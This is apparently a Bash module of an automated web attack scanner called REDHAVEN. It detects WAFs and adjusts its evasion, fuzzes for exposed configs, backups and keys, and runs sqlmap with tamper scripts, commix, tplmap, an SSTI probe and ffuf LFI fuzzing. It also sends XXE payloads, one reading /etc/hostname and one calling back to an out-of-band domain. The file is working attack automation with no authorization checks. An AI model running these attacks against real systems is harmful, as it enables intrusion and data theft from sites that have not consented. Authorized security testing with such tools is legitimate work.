#!/bin/bash
# REDHAVEN Module — Sourced by scanner.sh
# Do not run directly

# === DEEP FUZZING ===
# 17. UNIFIED STRATEGIC FUZZING (Phase 2B - Orchestrator)
run_deep_fuzzing() {
    if check_dependency "$OUT_DIR/recon/deep_fuzzing.txt" "Deep Fuzzing"; then return; fi
    log_phase "UNIFIED STRATEGIC FUZZING"
    
    # Aseguramos que el stack esté detectado
    detect_stack
    mkdir -p "$OUT_DIR/.temp" "$OUT_DIR/vulns"

    # ──────────────────────────────────────────────────────────────────
    # 0. WAF DETECTION (runs before fuzzing to choose evasion strategy)
    # ──────────────────────────────────────────────────────────────────
    local WAF_DETECTED=false
    if command -v wafw00f >/dev/null 2>&1; then
        log_step "Strategy 0: WAF Detection (wafw00f)..."
        wafw00f "https://$TARGET" -o "$OUT_DIR/recon/waf_detection.txt" 2>/dev/null || true
        if [ -s "$OUT_DIR/recon/waf_detection.txt" ] && grep -qiE "cloudflare|akamai|incapsula|sucuri|aws|barracuda" "$OUT_DIR/recon/waf_detection.txt"; then
            WAF_DETECTED=true
            log_warn "WAF DETECTED! Adjusting fuzzing strategy (slower, evasive payloads)..."
        else
            log_success "No WAF detected. Full speed fuzzing enabled."
        fi
    fi

    # ──────────────────────────────────────────────────────────────────
    # 1. DIRECTORY FUZZING (CONTEXTUAL)
    # ──────────────────────────────────────────────────────────────────
    WORDLIST="/tools/Assetnote/best_directories.txt"
    [ ! -f "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/dirb/common.txt"
    if [ "$IS_REST" = true ]; then
        log_step "Context: REST/API. Using API wordlists..."
        WORDLIST="/tools/Assetnote/best_api.txt"
    fi
    
    local FUZZ_THREADS=20
    if [ "$WAF_DETECTED" = true ] || [ "$STEALTH_MODE" = "true" ]; then
        FUZZ_THREADS=5
    fi
    
    log_step "Strategy 1: Feroxbuster Contextual Directory Fuzzing..."
    feroxbuster -u "https://$TARGET" -w "$WORDLIST" -t "$FUZZ_THREADS" --filter-status 404 -r --silent -o "$OUT_DIR/recon/deep_fuzzing.txt" || true

    # ──────────────────────────────────────────────────────────────────
    # 1B. DIRSEARCH — SMART CATEGORY FUZZING (The Sniper)
    # ──────────────────────────────────────────────────────────────────
    # Complementary to feroxbuster: scans for specific misconfigs, backups, and leaks
    # using dirsearch's excellent categorized wordlists.
    if command -v dirsearch >/dev/null 2>&1; then
        log_step "Strategy 1B: dirsearch Smart Category Scan (Conf, Git, Backups, DB)..."
        
        # Categories: conf,config,bak,backup,vcs,db,logs,keys
        # We skip 'common' because feroxbuster already covers it better
        local DS_THREADS=25
        if [ "$WAF_DETECTED" = true ] || [ "$STEALTH_MODE" = "true" ]; then
             DS_THREADS=5
        fi
        
        dirsearch -u "https://$TARGET" \
            --format=json -o "$OUT_DIR/recon/dirsearch_smart.json" \
            --wordlist-categories=conf,config,bak,backup,vcs,db,logs,keys \
            --threads="$DS_THREADS" --random-agent --exclude-status=404,400,500,502,503 \
            --quiet >/dev/null 2>&1 || true
            
        # Parse results and append to deep_fuzzing.txt if unique
        if [ -s "$OUT_DIR/recon/dirsearch_smart.json" ]; then
             # Extract URLs from JSON
             if command -v jq >/dev/null 2>&1; then
                 jq -r '.results[].url' "$OUT_DIR/recon/dirsearch_smart.json" 2>/dev/null >> "$OUT_DIR/recon/dirsearch_raw.txt" || true
                 # Sort and merge unique findings
                 if [ -s "$OUT_DIR/recon/dirsearch_raw.txt" ]; then
                     local ds_count=$(wc -l < "$OUT_DIR/recon/dirsearch_raw.txt")
                     log_stat "dirsearch findings" "$ds_count"
                     cat "$OUT_DIR/recon/dirsearch_raw.txt" >> "$OUT_DIR/recon/deep_fuzzing.txt"
                 fi
             fi
        fi
    else
        log_warn "dirsearch not found. Skipping Strategy 1B."
    fi

    # ──────────────────────────────────────────────────────────────────
    # 2. PARAMETER-BASED ATTACKS
    # ──────────────────────────────────────────────────────────────────
    if [ ! -s "$OUT_DIR/endpoints/params_only.txt" ]; then
        log_warn "No parameters found for intelligent fuzzing. Skipping parameter-based attacks."
        return
    fi

    # A. SQL Injection (DSSS - lightweight)
    log_step "Strategy 2: Targeted SQLi Probe (DSSS)..."
    if [ "$IS_DOTNET" = true ]; then
        grep -iE "\.aspx|\.asmx|\.svc" "$OUT_DIR/endpoints/params_only.txt" | head -n 20 > "$OUT_DIR/.temp/sqli_strat.txt" || true
    else
        grep -iE "\.php|\.jsp|\.cfm|=([0-9]+)$" "$OUT_DIR/endpoints/params_only.txt" | head -n 30 > "$OUT_DIR/.temp/sqli_strat.txt" || true
    fi
    
    if [ -s "$OUT_DIR/.temp/sqli_strat.txt" ]; then
        cat "$OUT_DIR/.temp/sqli_strat.txt" | parallel -j 5 "python3 /usr/local/bin/dsss -u {} >> $OUT_DIR/vulns/dsss_sqli.txt 2>/dev/null" || true
    fi

    # B. SQL Injection (SQLMAP — DEEP MODE only, heavy artillery)
    if [ "$DEEP_MODE" = "true" ] && command -v sqlmap >/dev/null 2>&1; then
        log_step "Strategy 2B: SQLMap Deep Injection (--deep flag active)..."
        # Select top 10 urls with numeric params (highest SQLi probability)
        grep -E '=[0-9]+(&|$)' "$OUT_DIR/endpoints/params_only.txt" | head -n 10 > "$OUT_DIR/.temp/sqlmap_targets.txt" || true
        if [ -s "$OUT_DIR/.temp/sqlmap_targets.txt" ]; then
            while IFS= read -r url; do
                timeout 120 sqlmap -u "$url" --batch --level=2 --risk=2 --threads=3 \
                    --output-dir="$OUT_DIR/.temp/sqlmap_out" \
                    --tamper=space2comment --random-agent \
                    2>/dev/null | tail -n 5 >> "$OUT_DIR/vulns/sqlmap_sqli.txt" || true
            done < "$OUT_DIR/.temp/sqlmap_targets.txt"
        fi
        log_stat "SQLMap targets scanned" "$(wc -l < "$OUT_DIR/.temp/sqlmap_targets.txt" 2>/dev/null || echo 0)"
    fi

    # C. Command Injection (Commix)
    log_step "Strategy 3: Targeted CmdInj Probe (Commix)..."
    grep -iE "cmd=|exec=|command=|ping=|query=|file=|read=|img=|log=|report=" "$OUT_DIR/endpoints/params_only.txt" | head -n 10 > "$OUT_DIR/.temp/commix_strat.txt" || true
    
    if [ -s "$OUT_DIR/.temp/commix_strat.txt" ]; then
        while IFS= read -r url; do
            commix --url="$url" --batch --level 1 --output-dir "$OUT_DIR/.temp/commix_logs" > /dev/null || true
        done < "$OUT_DIR/.temp/commix_strat.txt"
        grep -r "Result: detected" "$OUT_DIR/.temp/commix_logs" > "$OUT_DIR/vulns/commix_rce.txt" 2>/dev/null || true
    fi

    # D. Template Injection (Tplmap + SSTI Confirmation)
    log_step "Strategy 4: Targeted SSTI Probe (Tplmap)..."
    grep -iE "template=|theme=|view=|page=|name=|msg=|message=" "$OUT_DIR/endpoints/params_only.txt" | head -n 10 > "$OUT_DIR/.temp/ssti_strat.txt" || true
    if [ -s "$OUT_DIR/.temp/ssti_strat.txt" ]; then
         while IFS= read -r url; do
            python3 /usr/local/bin/tplmap -u "$url" >> "$OUT_DIR/vulns/ssti.txt" 2>/dev/null || true
         done < "$OUT_DIR/.temp/ssti_strat.txt"
    fi

    # E. SSTI Quick Confirmation ({{7*7}} probe — DEEP MODE)
    if [ "$DEEP_MODE" = "true" ]; then
        log_step "Strategy 4B: SSTI Quick Confirmation ({{7*7191}} probe)..."
        : > "$OUT_DIR/vulns/ssti_confirmed.txt"
        grep -iE "name=|msg=|message=|template=|q=|search=|text=" "$OUT_DIR/endpoints/params_only.txt" | head -n 20 | while IFS= read -r url; do
            local param_name
            param_name=$(echo "$url" | grep -oE '[?&]([^=]+)=' | tail -1 | tr -d '?&=')
            if [ -n "$param_name" ]; then
                local test_url
                test_url=$(echo "$url" | sed "s/${param_name}=[^&]*/${param_name}={{7*7191}}/")
                local resp
                resp=$(curl -sk --max-time 10 "$test_url" 2>/dev/null || true)
                if echo "$resp" | grep -q "50337"; then
                    echo "[SSTI-CONFIRMED] $test_url" >> "$OUT_DIR/vulns/ssti_confirmed.txt"
                    log_success "SSTI CONFIRMED: $test_url"
                fi
            fi
        done || true
    fi

    # ──────────────────────────────────────────────────────────────────
    # 3. LFI FUZZING (DEEP MODE only)
    # ──────────────────────────────────────────────────────────────────
    if [ "$DEEP_MODE" = "true" ]; then
        log_step "Strategy 5: LFI Fuzzing via ffuf (--deep flag active)..."
        # Select params likely to be file-inclusion targets
        grep -iE "file=|path=|page=|include=|doc=|document=|folder=|root=|pg=|style=|pdf=|template=|dir=|img=|imagename=|readfile=|download=" \
            "$OUT_DIR/endpoints/params_only.txt" | head -n 15 > "$OUT_DIR/.temp/lfi_targets.txt" || true
        
        if [ -s "$OUT_DIR/.temp/lfi_targets.txt" ]; then
            : > "$OUT_DIR/vulns/lfi_results.txt"
            while IFS= read -r url; do
                local param_name
                param_name=$(echo "$url" | grep -oE '[?&]([^=]+)=' | tail -1 | tr -d '?&=')
                if [ -n "$param_name" ]; then
                    local fuzz_url
                    fuzz_url=$(echo "$url" | sed "s/${param_name}=[^&]*/${param_name}=FUZZ/")
                    local lfi_wordlist="/tools/Assetnote/lfi_payloads.txt"
                    [ ! -f "$lfi_wordlist" ] && lfi_wordlist="/tools/lfi_wordlist.txt"
                    if [ -f "$lfi_wordlist" ]; then
                        ffuf -u "$fuzz_url" \
                            -w "$lfi_wordlist" \
                            -mc 200 -ms 0 -fw 0 \
                            -fs "$(curl -sk --max-time 5 "$url" 2>/dev/null | wc -c)" \
                            -t 5 -timeout 10 -s \
                            >> "$OUT_DIR/vulns/lfi_results.txt" 2>/dev/null || true
                    fi
                fi
            done < "$OUT_DIR/.temp/lfi_targets.txt"
            log_stat "LFI targets tested" "$(wc -l < "$OUT_DIR/.temp/lfi_targets.txt")"
        else
            log_warn "No file-inclusion parameters found."
        fi
    fi

    # ──────────────────────────────────────────────────────────────────
    # 4. XXE PROBING (Content-Type inspection + blind payload)
    # ──────────────────────────────────────────────────────────────────
    log_step "Strategy 6: XXE Quick Probe (XML Content-Type endpoints)..."
    : > "$OUT_DIR/vulns/xxe_findings.txt"
    
    # Find endpoints that accept XML input (from alive_urls or API endpoints)
    local xxe_targets=""
    if [ -s "$OUT_DIR/endpoints/clean_urls.txt" ]; then
        xxe_targets=$(grep -iE "(api|upload|import|convert|parse|feed|soap|wsdl|xml|rss|svg)" "$OUT_DIR/endpoints/clean_urls.txt" | head -n 20 || true)
    fi
    
    if [ -n "$xxe_targets" ]; then
        local xxe_payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><data>&xxe;</data></root>'
        local blind_xxe_payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/xxe-probe">]><root>&xxe;</root>'
        
        # If OOB domain available, use it for DNS callback
        if [ -n "$OOB_DOMAIN" ]; then
            blind_xxe_payload="<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://xxe.${OOB_DOMAIN}\">]><root>&xxe;</root>"
        fi
        
        echo "$xxe_targets" | while IFS= read -r url; do
            [ -z "$url" ] && continue
            
            # Send XML payload with Content-Type: application/xml
            local resp=$(curl -s --max-time 8 -o "$OUT_DIR/.temp/xxe_resp.tmp" -w "%{http_code}" \
                -X POST -H "Content-Type: application/xml" \
                -d "$xxe_payload" "$url" 2>/dev/null || echo "000")
            
            if [ -f "$OUT_DIR/.temp/xxe_resp.tmp" ]; then
                local body=$(cat "$OUT_DIR/.temp/xxe_resp.tmp" 2>/dev/null || echo "")
                
                # Check if hostname or other internal data leaked
                if echo "$body" | grep -qvE "^$" && echo "$body" | grep -qvE "error|invalid|unsupported"; then
                    if [ "$resp" = "200" ]; then
                        echo "[HIGH] XXE: Endpoint accepts XML — $url (status: $resp)" >> "$OUT_DIR/vulns/xxe_findings.txt"
                        echo "  Response preview: ${body:0:200}" >> "$OUT_DIR/vulns/xxe_findings.txt"
                    fi
                fi
            fi
            
            # Try blind XXE
            curl -s --max-time 8 -o /dev/null \
                -X POST -H "Content-Type: application/xml" \
                -d "$blind_xxe_payload" "$url" 2>/dev/null || true
        done || true
        
        rm -f "$OUT_DIR/.temp/xxe_resp.tmp"
        local xxe_count=$(wc -l < "$OUT_DIR/vulns/xxe_findings.txt" 2>/dev/null || echo 0)
        log_stat "XXE candidates" "$xxe_count"
    else
        log_warn "No XML-capable endpoints found for XXE testing."
    fi

    log_success "Unified Strategic Fuzzing completed."
    if [ "$DEEP_MODE" = "true" ]; then
        log_success "DEEP MODE extras completed: SQLMap, SSTI confirmation, LFI fuzzing."
    fi
}

